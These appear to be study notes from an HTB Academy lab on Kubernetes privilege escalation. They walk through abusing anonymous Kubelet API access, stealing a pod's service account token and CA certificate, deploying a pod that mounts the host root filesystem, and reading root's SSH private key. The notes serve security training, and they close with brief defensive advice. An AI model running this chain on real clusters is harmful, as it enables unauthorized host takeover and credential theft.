# Linux Privilege Escalation — Kubernetes (K8s)

**Module:** HTB Academy (Linux Privilege Escalation track)

## Kubernetes Overview

- **K8s** — open-source container orchestration platform, developed by Google, now under the **Cloud Native Computing Foundation**.
- Automates deployment, scaling, and management of containerized applications.
- Built around **pods** — one or more tightly coupled containers, each pod acting like its own mini-VM (own IP, hostname, etc.).
- Features: load balancing, service discovery, storage orchestration, self-healing, **RBAC**, Network Policies, Security Contexts.

### Kubernetes vs. Docker

| Function | Docker | Kubernetes |
|---|---|---|
| Primary role | Containerizing apps | Orchestrating containers |
| Scaling | Manual (Docker Swarm) | Automatic |
| Networking | Single network | Complex, policy-driven |
| Storage | Volumes | Wide range of storage options |

## Architecture

### Control Plane (Master Node)
- Manages/coordinates the cluster; maintains desired state.

| Component | TCP Port(s) |
|---|---|
| etcd | 2379, 2380 |
| API server | 6443 |
| Scheduler | 10251 |
| Controller Manager | 10252 |
| Kubelet API | 10250 |
| Read-Only Kubelet API | 10255 |

### Minions (Worker Nodes)
- Run the actual containerized applications, under Control Plane instruction.
- **Scheduler** decides which node a new pod runs on (based on API server's cluster-state view); **API server** then updates **etcd** with the decision.
- **API server** = entry point for all admin commands (via `kubectl` or controllers); talks to etcd to read/write cluster state.

---

## Kubernetes API

- Supports **declarative control** — define desired state, K8s works to achieve it.
- Hosted by **kube-apiserver** — handles RESTful requests against resources (Pods, Services, Deployments, etc.).

| Verb | Action |
|---|---|
| GET | Retrieve resource(s) |
| POST | Create a resource |
| PUT | Update a resource |
| PATCH | Partially update a resource |
| DELETE | Remove a resource |

### Authentication & Authorization

- Auth methods: client certificates, bearer tokens, authenticating proxy, HTTP basic auth.
- Authorization: **RBAC** — roles assigned to users/processes with specific resource permissions.
- **Kubelet anonymous access is enabled by default** — any request without a valid client cert is treated as `system:anonymous`. This is a major risk: anyone who can reach the Kubelet API can query/act on it unauthenticated.

## Enumeration

### API Server — Anonymous Access Check

```bash
curl https://10.129.10.11:6443 -k
```

```json
{
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "code": 403
}
```

- 403 here = API server correctly restricts anonymous root access — good, but **Kubelet API is often less protected**.

### Kubelet API — List Pods (Port 10250)

```bash
curl https://10.129.10.11:10250/pods -k | jq .
```

- Returns full pod metadata: names, namespaces, creation timestamps, container images, and **last-applied-configuration** (`kubectl.kubernetes.io/last-applied-configuration`).
- Risk: this config blob can leak **passwords, secrets, API tokens** used during deployment.
- Container image/version info → helps identify **known CVEs** to target.
- Namespace/UID/resourceVersion → useful for recon and targeting.

### Kubeletctl — Friendlier Pod Enumeration

```bash
kubeletctl -i --server 10.129.10.11 pods
```

```
POD                     NAMESPACE     CONTAINERS
coredns-78fcd69978-...  kube-system   coredns
nginx                   default       nginx
etcd-steamcloud         kube-system   etcd
```

### Kubeletctl — Scan for RCE-Vulnerable Pods

```bash
kubeletctl -i --server 10.129.10.11 scan rce
```

```
NODE IP        PODS    NAMESPACE   RCE
10.129.10.11   nginx   default     +   (RUN)
               etcd-steamcloud  kube-system  -
```

## Executing Commands in a Pod

```bash
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
# uid=0(root) gid=0(root) groups=0(root)
```

- Command executes **as root inside the container** — a strong starting point for further privilege escalation onto the host or other pods.

## Privilege Escalation — Extracting Service Account Credentials

### Extract the Service Account Token

```bash
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

### Extract the CA Certificate

```bash
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

### Check Your Effective Permissions

```bash
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

```
Resources    Verbs
pods         [get create list]
```

- If you can **get/create/list pods**, you can create a new pod configured to **mount the host's root filesystem**.

## Escalating via a Malicious Pod — Host Filesystem Mount

### Pod YAML — Mounts Host `/` into the Container

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

- `hostPath.path: /` mounted to `/root` inside the container → gives the pod full access to the **host's entire filesystem**.

### Deploy & Verify

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

```
NAME     READY   STATUS    AGE
nginx    1/1     Running   23m
privesc  1/1     Running   12s
```

### Extract Sensitive Host Data

```bash
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
# -----BEGIN OPENSSH PRIVATE KEY-----
```

- Retrieved the **host root user's private SSH key** — full host compromise achievable from here (SSH in as root).

## Key Takeaways

- **Kubelet API (port 10250)** anonymous access is a common, severe misconfiguration — enumerate it even if the main API server (6443) properly denies anonymous requests.
- `kubeletctl` is the primary tool for interacting with an exposed Kubelet API: listing pods, scanning for RCE-exploitable pods, and executing commands inside them.
- Root access **inside a container** is often just a stepping stone — extracting the **service account token + CA cert** lets you authenticate properly to the Kubernetes API and check your actual RBAC permissions (`auth can-i --list`).
- If you can **create pods**, you can almost always escalate to **full host compromise** by deploying a pod with a `hostPath` volume mounting `/` — this is the single most important technique in this section.
- Defense: disable Kubelet anonymous auth, enforce strict RBAC limiting who can create pods / mount hostPath volumes, and avoid overly permissive service accounts attached to workloads.
